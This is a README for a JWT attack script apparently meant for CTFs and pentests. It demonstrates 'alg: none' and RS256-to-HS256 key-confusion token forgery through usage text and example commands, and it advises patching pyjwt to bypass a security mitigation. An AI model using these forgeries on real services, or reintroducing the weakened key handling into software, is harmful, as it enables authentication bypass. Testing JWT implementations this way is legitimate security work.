# jwtools

This script implements **known trivial attacks against JSON Web Tokens** in order to test implementations encountered during CTFs or pentests.

It is possible to:

* Decode a JWT
* Replace the signing algorithm with 'none'
* Change the signing algorithm from 'RS256' to 'HS256' and use a public key to sign the token

## Dependency

### Recommended

This script relies on **pyjwt version 0.4.3** module. You can install it with the following:

```
$ pip install pyjwt==0.4.3
```

### Alternative

If you want to use the latest version of pyjwt, you will have to patch the library code. Developpers have added a "security mitigation" which prevents the user from signing a JWT with a public key. In order to bypass this restriction, you can replace the code of **prepare_key()** in ~/.local/lib/python2.7/site-packages/jwt/algorithms.py with the following:

BEFORE

![Original prepare_key](./screens/original_prepare_key.png)

AFTER

![Modified prepare_key](./screens/modified_prepare_key.png)

## Usage

```bash
$ python jwtools.py -h
usage: ./jwtools.py [-h] [-v] [-p PUBLIC] token {info,to-none,to-hs256}

Known attacks against JSON Web Tokens in order to test implementations security.

positional arguments:
  token                 The JWT you want to modify.
  {info,to-none,to-hs256}
                        info: displays decoded token content.
                        to-none: replaces token 'alg' field with 'none'.
                        to-hs256: replaces token 'alg' field with 'HS256' and signs it with given public key.

optional arguments:
  -h, --help            show this help message and exit
  -v, --version         show program's version number and exit
  -p PUBLIC, --public PUBLIC
                        The public key associated with the token
```

## Examples

* info

```bash
$ python jwtools.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb2xsb3ciOiJib2l0ZWFrbG91In0.G-N1qBVvkvmC_p6MQ-99LQBX1cR0t40ANvP3HrIOs5I info

[+] Decoded token
        Header: {"alg":"HS256","typ":"JWT"}
        Payload: {"follow":"boiteaklou"}
```

* to-none

```bash
$ python jwtools.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb2xsb3ciOiJib2l0ZWFrbG91In0.G-N1qBVvkvmC_p6MQ-99LQBX1cR0t40ANvP3HrIOs5I to-none

[+] Signature algorithm successfuly changed to 'none'.
[+] New token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJmb2xsb3ciOiJib2l0ZWFrbG91In0

$ python jwtools.py eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJmb2xsb3ciOiJib2l0ZWFrbG91In0 info

[+] Decoded token
        Header: {"alg":"none","typ":"JWT"}
        Payload: {"follow":"boiteaklou"}
```

* to-hs256

```bash
$ python jwtools.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb2xsb3ciOiJib2l0ZWFrbG91In0.G-N1qBVvkvmC_p6MQ-99LQBX1cR0t40ANvP3HrIOs5I --public public.pem to-hs256

[+] Signature algorithm successfuly changed to 'HS256'.
[+] New token signed with public key: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb2xsb3ciOiJib2l0ZWFrbG91In0.Q64GJHgp-f1pYb4a75aaBNkbiRqnwGGuffsOG8_CjmQ

$ python jwtools.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb2xsb3ciOiJib2l0ZWFrbG91In0.Q64GJHgp-f1pYb4a75aaBNkbiRqnwGGuffsOG8_CjmQ info

[+] Decoded token
        Header: {"alg":"HS256","typ":"JWT"}
        Payload: {"follow":"boiteaklou"}
```
